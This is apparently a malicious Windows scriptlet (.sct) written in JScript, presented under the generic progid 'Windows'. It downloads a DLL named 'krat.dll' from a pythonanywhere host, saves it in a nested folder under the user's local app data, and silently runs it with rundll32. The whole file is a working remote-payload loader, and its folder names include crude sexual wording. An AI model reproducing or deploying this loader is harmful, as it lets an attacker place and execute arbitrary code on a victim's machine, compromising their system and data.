<?XML version="1.0"?>
<scriptlet>
  <registration
    progid="Windows" >
    <script language="JScript">
      <![CDATA[
        function reverseString(s) {
            return String(s).split("").reverse().join("");
        }

        function base64Decode(s) {
            var xml = new ActiveXObject("Msxml2.DOMDocument.6.0");
            var node = xml.createElement("b64");

            node.dataType = "bin.base64";
            node.text = s;

            return node.nodeTypedValue;
        }

        function decodeBackwardsBase64(blob) {
            return base64Decode(blob);
        }

		var shell = new ActiveXObject("WScript.Shell");
        var fso = new ActiveXObject("Scripting.FileSystemObject");
        var http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");

        http.Open("GET", "http://akinomoreno.pythonanywhere.com/krat.dll", false);
        http.Send();

        var bytes = http.ResponseBody;

        function ensureFolder(path) {
            if (fso.FolderExists(path))
                return;

            var parent = fso.GetParentFolderName(path);

            if (!fso.FolderExists(parent))
                ensureFolder(parent);

            fso.CreateFolder(path);
        }

        var outputDir = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\iwannafuckfaye\\Kiel\\Loves\\Faye\\So\\Much";
        var outputFile = outputDir + "\\KielAndFayeLovesEachOther.dll";

        ensureFolder(outputDir);

        if (!fso.FileExists(outputFile)) {
            var stream = new ActiveXObject("ADODB.Stream");

            stream.Type = 1;
            stream.Open();
            stream.Write(bytes);
            stream.SaveToFile(outputFile, 2);
            stream.Close();

			shell.Run('rundll32.exe "' + outputFile + '" main', 0, false);
        }
      ]]>
    </script>
  </registration>
</scriptlet>